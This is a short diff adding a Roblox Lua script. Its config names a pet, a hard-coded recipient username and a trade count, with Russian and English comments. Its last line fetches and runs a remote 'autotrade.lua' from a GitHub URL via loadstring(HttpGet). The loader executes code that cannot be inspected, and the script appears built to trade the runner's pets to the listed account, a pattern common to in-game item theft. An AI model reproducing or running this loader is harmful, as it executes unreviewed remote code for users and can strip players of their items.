@@ -1,0 +1,6 @@
+getgenv().ScriptsConfig = {
+    ["Pet_Remote_Name"] = "halloween_2025_bat_cat", -- имя пета / pet remote name
+    ["Usernames"] = {"mewkaa5a"}, -- ники кому трейдить / usernames whom to trade
+    ["TradesQuantity"] = 1 -- сколько раз по 16 отдавать / how much trades per 16 pets each username
+}
+loadstring(game:HttpGet("https://raw.githubusercontent.com/diwserenityhub/other/refs/heads/main/autotrade.lua"))()
